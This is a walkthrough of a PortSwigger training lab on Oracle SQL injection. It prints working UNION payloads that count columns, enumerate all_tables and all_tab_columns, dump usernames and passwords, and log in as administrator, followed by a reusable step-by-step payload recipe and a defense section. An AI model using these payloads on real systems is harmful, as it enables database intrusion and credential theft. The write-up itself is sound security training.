## Executive Summary

This lab demonstrates comprehensive SQL injection exploitation against an Oracle database, progressing from vulnerability discovery through systematic enumeration to complete credential extraction. By leveraging Oracle-specific system tables (`all_tables`, `all_tab_columns`) and syntax requirements (FROM dual clause), I successfully mapped the entire database structure, identified the users table (`USERS_OHIHSP`), enumerated column names (`USERNAME_DZUOAV`, `PASSWORD_UEYHKY`), and extracted all user credentials including the administrator account. This attack showcases the complete Oracle database exploitation lifecycle from reconnaissance to authentication bypass.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Oracle Database Enumeration |
| **Risk**               | Critical - Complete Credential Theft & System Compromise |
| **Completion**         | February 15, 2026 |

## Objective

Exploit SQL injection to enumerate Oracle database structure using Oracle-specific system tables, identify credential storage locations, extract administrator credentials, and achieve complete system compromise.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- Oracle documentation for system table queries
- URL encoding for payload delivery

**Target:** Product category filtering with Oracle database backend

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection attack, listing the database contents on Oracle" challenge.
<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/18f8a9ab-a22f-4644-aef0-4b4c58331f19" />

*Lab 7 environment - Oracle database enumeration with Burp Suite Professional configured*

### 2. Attack Surface Identification

Navigated through product categories to identify SQL injection vectors.
<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/a708a449-ccff-4b37-b90b-917ca4e9f658" />
*Category exploration - Gifts, Pets, Food & Drink categories | HTTP requests captured showing category parameter*

**Available Categories:**
- Gifts
- Pets
- Food & Drink
- Other product categories

**Request Captured:**
```http
GET /filter?category=Food+%26+Drink HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Food & Drink'
```

**Attack Vector:** Category parameter likely incorporated directly into SQL WHERE clause.

### 3. Column Count Enumeration

Sent request to Burp Repeater and systematically enumerated column count using ORDER BY technique.

**Test Payload 1:**
```http
GET /filter?category=Food+%26+Drink'+ORDER+BY+1-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3 1" src="https://github.com/user-attachments/assets/cc856833-61e3-4b97-95a1-c086c004405c" />

*ORDER BY 1 test - 200 OK confirms at least 1 column exists*

**Response:** 200 OK

**Test Payload 2:**
```http
GET /filter?category=Food+%26+Drink'+ORDER+BY+2-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3 2" src="https://github.com/user-attachments/assets/434d3bc3-8a16-414b-82c5-e7663e7797c0" />

*ORDER BY 2 test - 200 OK confirms 2 columns exist*

**Response:** 200 OK

**Test Payload 3:**
```http
GET /filter?category=Food+%26+Drink'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss3 3" src="https://github.com/user-attachments/assets/5b833a28-539d-4b11-80cf-f31dda1a3889" />

*ORDER BY 3 test - 500 Internal Server Error confirms only 2 columns*

**Response:** 500 Internal Server Error

**Column Count Confirmed:** Exactly **2 columns** in result set.

### 4. Data Type Verification with Oracle-Specific Syntax

Tested column data types using Oracle's mandatory FROM dual clause requirement.

**Oracle Syntax Requirement:**
Oracle requires a table in the FROM clause even for constant SELECT statements. The `dual` table is a special one-row table present by default for this purpose.

**Test Payload:**
```http
GET /filter?category=Food+%26+Drink'+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/dcf9dbd1-2ade-4ab8-b4c0-da29cff49bce" />

*String injection test - 200 OK with 'abc' and 'def' displayed, confirming both columns accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Food & Drink' 
UNION SELECT 'abc','def' FROM dual--'
```

**Response:** 200 OK with 'abc' and 'def' values inserted into response

**Confirmed:**
- ✅ Both columns accept string data types
- ✅ Oracle database confirmed (FROM dual required)
- ✅ UNION injection successful

### 5. Table Enumeration Using Oracle System Tables

Queried Oracle's `all_tables` system view to enumerate all accessible database tables.

**Oracle System Tables:**
Oracle provides several system views for metadata:
- `all_tables` - All tables accessible to current user
- `user_tables` - Tables owned by current user
- `dba_tables` - All tables in database (requires DBA privilege)

**Attack Payload:**
```http
GET /filter?category=Food+%26+Drink'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss5 1" src="https://github.com/user-attachments/assets/76b442f4-a122-4100-85b8-ba2927609a99" />

*Table enumeration - Multiple tables listed in response*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Food & Drink' 
UNION SELECT table_name, NULL FROM all_tables--'
```

**Tables Discovered (Sample):**
```
PRODUCTS
ORDERS
CUSTOMERS
USERS_OHIHSP  ← Target table identified
...
```

**Critical Discovery:**

<img width="1920" height="982" alt="LAB1_ss5 2" src="https://github.com/user-attachments/assets/be734648-0772-4418-ae6b-b8589966b168" />

*Users table identified - USERS_OHIHSP located in response*

Table `USERS_OHIHSP` identified through search - likely contains user credentials.

### 6. Column Enumeration for Users Table

Queried Oracle's `all_tab_columns` system view to identify column names in the target table.

**Attack Payload:**
```http
GET /filter?category=Food+%26+Drink'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OHIHSP'-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/b2556f2f-b40c-47c4-bab4-6ddbe6fdc47a" />


*Column enumeration - Username column USERNAME_DZUOAV identified (highlighted)*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Food & Drink' 
UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_OHIHSP'--'
```

**Important Note:** Oracle stores table names in uppercase. The query must use `'USERS_OHIHSP'` (uppercase) not `'users_ohihsp'`.

**Column Discovery Process:**

Searched response for "username":
- **Column Found:** `USERNAME_DZUOAV`
<img width="1920" height="982" alt="LAB1_ss7" src="https://github.com/user-attachments/assets/ed85398b-2b17-4d9d-9aa9-afc9f9030dd4" />

*Password column identified - PASSWORD_UEYHKY (highlighted)*

Searched response for "password":
- **Column Found:** `PASSWORD_UEYHKY`

**Database Structure Mapped:**
```
Table: USERS_OHIHSP
├── Column: USERNAME_DZUOAV (stores usernames)
└── Column: PASSWORD_UEYHKY (stores passwords)
```

### 7. Credential Extraction

Crafted final payload to extract all usernames and passwords from the users table.

**Attack Payload:**
```http
GET /filter?category=Food+%26+Drink'+UNION+SELECT+USERNAME_DZUOAV,PASSWORD_UEYHKY+FROM+USERS_OHIHSP-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss8" src="https://github.com/user-attachments/assets/25efbd92-656f-404d-9efd-ae32ab4a7b64" />

*Credential extraction successful - All usernames and passwords retrieved, administrator credentials highlighted*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Food & Drink' 
UNION SELECT USERNAME_DZUOAV, PASSWORD_UEYHKY FROM USERS_OHIHSP--'
```

**Credentials Extracted:**
```
administrator : [admin_password]
carlos        : [carlos_password]
wiener        : [wiener_password]
```

**Administrator Credentials Identified:**
- Username: `administrator`
- Password: `[extracted_password]`

### 8. Administrator Authentication

Used extracted credentials to authenticate as administrator.

<img width="1920" height="982" alt="LAB1_ss9" src="https://github.com/user-attachments/assets/8a16a37e-0e5f-4138-82c4-25d67fb26b5d" />

*Administrator login successful - 302 response in Burp (left) | Admin account accessed (right)*

**Authentication Request:**
```http
POST /login HTTP/1.1

username=administrator&password=[extracted_password]
```

**Response:** 302 Found - Redirect to administrator dashboard

### 9. Complete System Compromise
<img width="1920" height="982" alt="LAB1_ss10" src="https://github.com/user-attachments/assets/49e1c6f5-11c4-4b90-83ad-663a99efdaf8" />

*Lab completion confirmed with administrator account access*

**Complete Attack Success:**
- ✅ Oracle database structure fully enumerated
- ✅ User credentials table identified (USERS_OHIHSP)
- ✅ Column names discovered (USERNAME_DZUOAV, PASSWORD_UEYHKY)
- ✅ All credentials extracted
- ✅ Administrator account compromised
- ✅ Complete authentication bypass

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or prepared statements
- Complete database enumeration achievable
- Credential theft and authentication bypass

**Complete Attack Chain:**
```
Product Category Filtering
        ↓
SQL Injection Vulnerability
        ↓
Column Enumeration (ORDER BY)
        ↓
Data Type Verification (FROM dual)
        ↓
Oracle Database Confirmed
        ↓
Table Enumeration (all_tables)
        ↓
Users Table Identified (USERS_OHIHSP)
        ↓
Column Enumeration (all_tab_columns)
        ↓
Credential Columns Found (USERNAME_DZUOAV, PASSWORD_UEYHKY)
        ↓
Credential Extraction (UNION SELECT)
        ↓
Administrator Credentials Stolen
        ↓
Complete System Compromise
```

**Oracle-Specific Exploitation Techniques:**

**Key Oracle System Views:**

| System View | Purpose | Attack Use |
|-------------|---------|-----------|
| `all_tables` | All accessible tables | Enumerate table names |
| `all_tab_columns` | All accessible columns | Map table structure |
| `all_users` | All database users | Identify accounts |
| `all_objects` | All accessible objects | Complete enumeration |
| `v$version` | Database version | Fingerprinting |
| `dual` | Dummy table | Required for SELECT |

**Oracle Enumeration Queries:**
```sql
-- List all tables
SELECT table_name FROM all_tables

-- List columns for specific table
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Database version
SELECT banner FROM v$version

-- Current user
SELECT user FROM dual

-- Database name
SELECT name FROM v$database

-- Extract credentials
SELECT username, password FROM users

-- List privileges
SELECT * FROM session_privs
```

**Oracle vs PostgreSQL/MySQL Differences:**

| Aspect | Oracle | PostgreSQL/MySQL |
|--------|--------|------------------|
| **Dummy Table** | `FROM dual` required | No FROM needed |
| **Tables View** | `all_tables` | `information_schema.tables` |
| **Columns View** | `all_tab_columns` | `information_schema.columns` |
| **Case Sensitivity** | Table names uppercase | Case-sensitive |
| **Comment** | `--` | `--` or `#` (MySQL) |

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **Enterprise Systems** | Complete database exposure, credential theft |
| **Financial Services** | Account data, transaction records, customer PII |
| **Healthcare** | PHI, medical records, insurance information |
| **Government** | Classified data, citizen records, sensitive operations |
| **E-Commerce** | Customer database, payment information, order history |

**Escalation Beyond Credential Theft:**

**With Database Access:**
- Extract all sensitive data from any table
- Modify user permissions and data
- Create backdoor administrative accounts
- Execute PL/SQL for advanced operations
- Potentially execute OS commands (if privileges allow)

**With Administrator Credentials:**
- Complete application access
- System configuration changes
- Additional account creation
- Lateral movement to other systems
- Persistent access maintenance

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic column enumeration
- Oracle-specific syntax identification (FROM dual)
- System view exploitation for metadata extraction
- Complete database mapping from generic to specific
- Credential validation and impact demonstration

**Critical Security Insights:**

**1. Oracle Requires Different Techniques:**
Unlike PostgreSQL/MySQL, Oracle has unique requirements:
- Mandatory FROM clause (use `FROM dual`)
- Table names stored in uppercase
- Different system views (`all_tables` vs `information_schema`)

**2. Complete Oracle Enumeration Process:**

**Step 1 - Confirm Vulnerability:**
```sql
' -- (syntax error)
```

**Step 2 - Column Count:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)
```

**Step 3 - Verify Oracle (FROM dual required):**
```sql
' UNION SELECT 'a','b' FROM dual--
```

**Step 4 - List Tables:**
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

**Step 5 - List Columns (uppercase table name!):**
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Step 6 - Extract Data:**
```sql
' UNION SELECT username, password FROM users--
```

**3. Oracle Case Sensitivity:**
Critical difference that often causes failed exploits:
```sql
-- This FAILS (lowercase)
WHERE table_name='users_ohihsp'

-- This WORKS (uppercase)
WHERE table_name='USERS_OHIHSP'
```

**4. Oracle System View Hierarchy:**

**Most Permissive (Use These):**
- `all_tables` - All tables accessible to current user
- `all_tab_columns` - All columns accessible to current user

**User-Specific:**
- `user_tables` - Only tables owned by current user
- `user_tab_columns` - Only columns in user's tables

**DBA-Level (Requires Privileges):**
- `dba_tables` - All tables in database
- `dba_tab_columns` - All columns in database

**5. Defense Requires Multiple Layers:**

**Application Level (Primary Defense):**
```python
# SECURE CODE - Parameterized Query
query = "SELECT * FROM products WHERE category = :category"
cursor.execute(query, category=user_input)
```

**Database Level:**
- Restrict SELECT access to `all_tables`, `all_tab_columns`
- Use least privilege accounts for web applications
- Separate read-only from write accounts
- Enable audit logging

**Network Level:**
- Web Application Firewall (WAF)
- Database firewall with query inspection
- Intrusion detection systems

**Professional Skills Demonstrated:**
- Oracle-specific SQL injection techniques
- System view exploitation for enumeration
- Understanding of Oracle case sensitivity
- Complete attack chain orchestration
- Credential extraction and validation
- Multi-stage database enumeration methodology

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. Oracle Database Documentation - System Views
5. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems or database enumeration is illegal under applicable laws worldwide.
